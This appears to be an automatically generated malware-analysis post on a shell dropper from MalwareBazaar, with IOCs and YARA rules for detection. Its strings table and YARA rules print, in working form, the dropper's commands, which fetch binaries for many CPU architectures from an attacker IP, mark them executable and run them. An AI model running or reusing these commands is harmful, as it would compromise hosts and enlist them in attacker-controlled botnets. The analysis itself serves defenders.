# Storytime: Dissecting a An unlabelled SH dropper

> **Source:** [MalwareBazaar](https://bazaar.abuse.ch/sample/33b554e0ba3a5c402fe0442d2f98e72d18f5cb9e2c4ead4bfa6d1a0fe9bfb482/) · **SHA-256** `33b554e0ba3a5c402fe0442d2f98e72d18f5cb9e2c4ead4bfa6d1a0fe9bfb482` · **Family** `unknown` · **Static analysis only — the sample was never run.**

## The Story

It showed up on MalwareBazaar as a 1730-byte `sh` file, with no family label. We pulled exactly one copy into quarantine, cracked open the password-protected archive, and read the bytes as inert text. Nothing here was executed — every claim below comes from reading the code, not running it. Here is what it was hiding.

## First Contact — The Code As It Arrived

Straight out of the archive, a portion of the sample looks like this (defanged):

```shell
#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/mips; chmod +x mips; ./mips; rm -rf mips
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/sh4; chmod +x sh4; ./sh4; rm -rf sh4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/x86; chmod +x x86; ./x86; rm -rf x86
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/i686; chmod +x i686; ./i686; rm -rf i686
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/ppc; chmod +x ppc; ./ppc; rm -rf ppc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/i586; chmod +x i586; ./i586; rm -rf i586
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/m68k; chmod +x m68k; ./m68k; rm -rf m68k
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/sparc; chmod +x sparc; ./sparc; rm -rf sparc
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/arm; chmod +x arm; ./arm; rm -rf arm
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/arm4; chmod +x arm4; ./arm4; rm -rf arm4
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://94[.]183[.]232[.]247/arm5; chmod +x arm5; ./arm5; rm -rf arm5
cd /tmp || cd /v
... (truncated)
```

## What It Wants To Do

The behaviour that matters, recovered from the (deobfuscated) code: `shell_dropper`. It pulls follow-on payloads down with a shell download tool, makes them executable, and launches them — a classic drop-and-run loader.

## Technical Architecture & System Impact

How the pieces fit together and what each stage would do to a host that ran it (reconstructed from static evidence — nothing here was executed):

### Execution chain

- **Stage 0 — delivery:** the `sh` shell dropper analyzed here lands on the host and runs.

### System surfaces touched

| Surface | Effect on the host |
|---|---|
| Payload delivery / botnet enlistment | Pulls additional executables from attacker infrastructure, marks them runnable, and launches them — the host becomes a node executing attacker-controlled code. |

**Blast radius:** a host that ran this would, by design, fetches and runs further attacker code, establishes outbound C2. Treat any host with these indicators as compromised pending response.

## Executive Summary

One MalwareBazaar submission, analyzed statically — never executed, loaded, imported, or dynamically tested. Static evidence produced 18 IOCs and 2 code/string findings.

## What The Agent Did

1. Pulled recent MalwareBazaar metadata.
2. Selected one unprocessed or source-preferred candidate.
3. Downloaded only that sample's password-protected ZIP into quarantine.
4. Read one archived member into memory for static analysis.
5. Calculated hashes, entropy, file magic, printable strings, IOCs, and suspicious code/string patterns.
6. Generated this technical blog, structured JSON, IOC JSON, YARA, and a verifier prompt.

## Sample Identity

| Field | Value |
|---|---|
| MalwareBazaar SHA-256 | `33b554e0ba3a5c402fe0442d2f98e72d18f5cb9e2c4ead4bfa6d1a0fe9bfb482` |
| Analyzed SHA-256 | `33b554e0ba3a5c402fe0442d2f98e72d18f5cb9e2c4ead4bfa6d1a0fe9bfb482` |
| Family label | `unknown` |
| File name | `Ciabins.sh` |
| Archived member | `33b554e0ba3a5c402fe0442d2f98e72d18f5cb9e2c4ead4bfa6d1a0fe9bfb482.sh` |
| File type | `sh` |
| First seen | `2026-06-21 09:31:48` |
| Tags | `sh` |

## Static Triage

| Property | Value |
|---|---:|
| Bytes analyzed | 1730 |
| Entropy | 4.604 |
| Printable strings | 15 |
| File magic | `script with shebang` |

## IOCs

| Type | Value |
|---|---|
| MD5 | `127d91b5a6b945bf7f4111745d786e1a` |
| SHA-1 | `74c798eece8ac8486b418db8b57f265fa47236ed` |
| SHA-256 | `33b554e0ba3a5c402fe0442d2f98e72d18f5cb9e2c4ead4bfa6d1a0fe9bfb482` |
| URL | `http://94.183.232.247/arm` |
| URL | `http://94.183.232.247/arm4` |
| URL | `http://94.183.232.247/arm5` |
| URL | `http://94.183.232.247/arm6` |
| URL | `http://94.183.232.247/arm7` |
| URL | `http://94.183.232.247/i586` |
| URL | `http://94.183.232.247/i686` |
| URL | `http://94.183.232.247/m68k` |
| URL | `http://94.183.232.247/mips` |
| URL | `http://94.183.232.247/mipsel` |
| URL | `http://94.183.232.247/ppc` |
| URL | `http://94.183.232.247/sh4` |
| URL | `http://94.183.232.247/sparc` |
| URL | `http://94.183.232.247/x86` |
| IP | `94.183.232.247` |

## Static Findings

| Severity | Category | Evidence | Detail |
|---|---|---|---|
| high | shell_dropper | `\bwget\b` | Matched 14 occurrence(s) |
| high | shell_dropper | `\bchmod\s+(?:\+x|777|755)` | Matched 14 occurrence(s) |

## Selected Strings

These strings were selected because they contain network indicators or suspicious execution markers.

| String |
|---|
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/mips; chmod +x mips; ./mips; rm -rf mips` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/sh4; chmod +x sh4; ./sh4; rm -rf sh4` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/x86; chmod +x x86; ./x86; rm -rf x86` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/i686; chmod +x i686; ./i686; rm -rf i686` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/ppc; chmod +x ppc; ./ppc; rm -rf ppc` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/i586; chmod +x i586; ./i586; rm -rf i586` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/m68k; chmod +x m68k; ./m68k; rm -rf m68k` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/sparc; chmod +x sparc; ./sparc; rm -rf sparc` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/arm; chmod +x arm; ./arm; rm -rf arm` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/arm4; chmod +x arm4; ./arm4; rm -rf arm4` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/arm5; chmod +x arm5; ./arm5; rm -rf arm5` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/arm6; chmod +x arm6; ./arm6; rm -rf arm6` |
| `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd /; wget http://94.183.232.247/arm7; chmod +x arm7; ./arm7; rm -rf arm7` |

## What We've Learned So Far

How this sample sits against everything the loop has analyzed before:

- Corpus before this sample: **6** prior sample(s).
- Recurring techniques across the corpus: `shell_dropper` (×2).


## YARA Rules

The first rule combines an exact SHA-256 condition with selected static strings. The second rule is generated from static source/string findings.

```yara
import "hash"

rule Single_Sample_Static_33b554e0ba3a5c40
{
  meta:
    source = "loop-engineering single-sample static analysis"
    analysis = "static only; sample not executed"
    sha256 = "33b554e0ba3a5c402fe0442d2f98e72d18f5cb9e2c4ead4bfa6d1a0fe9bfb482"
    md5 = "127d91b5a6b945bf7f4111745d786e1a"
    sha1 = "74c798eece8ac8486b418db8b57f265fa47236ed"
    file_magic = "script with shebang"
    malwarebazaar_family = "unknown"
  strings:
    $s01 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/mips; chmod +x mips; ./mips; rm -rf mips" nocase
    $s02 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel" nocase
    $s03 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/sh4; chmod +x sh4; ./sh4; rm -rf sh4" nocase
    $s04 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/x86; chmod +x x86; ./x86; rm -rf x86" nocase
    $s05 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/i686; chmod +x i686; ./i686; rm -rf i686" nocase
    $s06 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/ppc; chmod +x ppc; ./ppc; rm -rf ppc" nocase
    $s07 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/i586; chmod +x i586; ./i586; rm -rf i586" nocase
    $s08 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/m68k; chmod +x m68k; ./m68k; rm -rf m68k" nocase
    $s09 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/sparc; chmod +x sparc; ./sparc; rm -rf sparc" nocase
    $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/arm; chmod +x arm; ./arm; rm -rf arm" nocase
    $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/arm4; chmod +x arm4; ./arm4; rm -rf arm4" nocase
    $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/arm5; chmod +x arm5; ./arm5; rm -rf arm5" nocase
    $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/arm6; chmod +x arm6; ./arm6; rm -rf arm6" nocase
    $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.183.232.247/arm7; chmod +x arm7; ./arm7; rm -rf arm7" nocase
  condition:
    hash.sha256(0, filesize) == "33b554e0ba3a5c402fe0442d2f98e72d18f5cb9e2c4ead4bfa6d1a0fe9bfb482" or 2 of ($s*)
}

rule Static_Source_Malware_Indicators
{
  meta:
    source = "loop-engineering static source analysis"
    language_hint = "shell"
    analysis = "static text only; sample not executed"
  strings:
    $url_01 = "http://94.183.232.247/arm" nocase
    $url_02 = "http://94.183.232.247/arm4" nocase
    $url_03 = "http://94.183.232.247/arm5" nocase
    $url_04 = "http://94.183.232.247/arm6" nocase
    $url_05 = "http://94.183.232.247/arm7" nocase
    $url_06 = "http://94.183.232.247/i586" nocase
    $url_07 = "http://94.183.232.247/i686" nocase
    $url_08 = "http://94.183.232.247/m68k" nocase
    $url_09 = "http://94.183.232.247/mips" nocase
    $url_10 = "http://94.183.232.247/mipsel" nocase
    $url_11 = "http://94.183.232.247/ppc" nocase
    $url_12 = "http://94.183.232.247/sh4" nocase
    $url_13 = "http://94.183.232.247/sparc" nocase
    $url_14 = "http://94.183.232.247/x86" nocase
    $ip_15 = "94.183.232.247" nocase
  condition:
    any of them
}
```

## Analyst Assessment

MalwareBazaar did not provide a family label; treat this as an unknown sample until corroborated. Static strings expose network indicators that can support enrichment and hunting. High-severity static patterns were found, especially execution or script-loading indicators.

## Verification Notes

- A second agent should verify that the blog claims are supported by `analysis.json` and `sample.yar`.
- No dynamic behavior should be asserted unless a future static source analysis produces supporting evidence.
- The raw sample ZIP remains in `quarantine/` and must not be committed.
